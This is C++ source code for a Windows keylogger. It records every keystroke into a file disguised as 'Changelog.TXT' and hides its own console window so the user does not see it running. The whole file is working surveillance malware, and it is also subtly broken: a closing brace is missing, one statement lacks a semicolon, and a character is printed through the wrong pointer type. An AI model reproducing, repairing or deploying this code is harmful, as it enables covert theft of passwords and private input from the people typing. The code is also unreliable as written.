#include <stdio.h>
#include <iostream>
#include <string>
#include <time.h>
#include <windows.h>
#include <Winuser.h>

using namespace std;


int running = 1;
int Save (int key_stroke, char *file); //Saves keystrokes in int save
void Stealth(); //hides the program


int main() {

	Stealth();

		int i;
		while (running == 1) {
			for(i = 8; i <= 190; i++) {
				if (GetAsyncKeyState(i) == +32767) {
					Save(i, "Changelog.TXT"); // makes .TXT file to save logs, in this case, changelog

 				}
				if(running == 0) {
					exit(1);
				}
        }
	}
	return 0;

/* ******************************************* */
/* ******************************************* */

int Save (int key_stroke, char *file)
{
    if ( (key_stroke == 1) || (key_stroke == 2) ) //excludes mouse clicks
       return 0;
/** everything below this line is converted from hexi-decimal to english */
    FILE *OUTPUT_FILE;
    OUTPUT_FILE = fopen(file, "a+");
    cout << key_stroke << endl;

    if (key_stroke == 8)
       fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
    else if (key_stroke == 13)
       fprintf(OUTPUT_FILE, "%s", "\n");
    else if (key_stroke == 32)
       fprintf(OUTPUT_FILE, "%s", " ");
    else if (key_stroke == VK_TAB)
       fprintf(OUTPUT_FILE, "%s", "[TAB]");
    else if (key_stroke == VK_SHIFT)
       fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
    else if (key_stroke == VK_CONTROL)
       fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
    else if (key_stroke == VK_ESCAPE)
       fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
    else if (key_stroke == VK_END)
       fprintf(OUTPUT_FILE, "%s", "[END]");
    else if (key_stroke == VK_HOME)
       fprintf(OUTPUT_FILE, "%s", "[HOME]");
    else if (key_stroke == VK_LEFT)
       fprintf(OUTPUT_FILE, "%s", "[LEFT]");
    else if (key_stroke == VK_UP)
       fprintf(OUTPUT_FILE, "%s", "[UP]");
    else if (key_stroke == VK_RIGHT)
       fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
    else if (key_stroke == VK_DOWN)
       fprintf(OUTPUT_FILE, "%s", "[DOWN]");
    else if (key_stroke == 190 || key_stroke == 110)
       fprintf(OUTPUT_FILE, "%s", ".");
    else if (key_stroke == 96)
       fprintf(OUTPUT_FILE, "%s", "0");
    else if (key_stroke == 97)
       fprintf(OUTPUT_FILE, "%s", "1");
    else if (key_stroke == 98)
       fprintf(OUTPUT_FILE, "%s", "2");
    else if (key_stroke == 99)
       fprintf(OUTPUT_FILE, "%s", "3");
    else if (key_stroke == 100)
       fprintf(OUTPUT_FILE, "%s", "4");
    else if (key_stroke == 101)
       fprintf(OUTPUT_FILE, "%s", "5");
    else if (key_stroke == 102)
       fprintf(OUTPUT_FILE, "%s", "6");
    else if (key_stroke == 103)
       fprintf(OUTPUT_FILE, "%s", "7");
    else if (key_stroke == 104)
       fprintf(OUTPUT_FILE, "%s", "8");
    else if (key_stroke == 105)
       fprintf(OUTPUT_FILE, "%s", "9");
    else if(key_stroke == 172)
        fprintf(OUTPUT_FILE, "%s", "¼")
    else if (key_stroke == 120)
        running = 0;
    else
        fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
    return 0;
}
/* ******************************************* */
/* ******************************************* */

void Stealth()
{
     HWND stealth;
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(stealth,0);
}
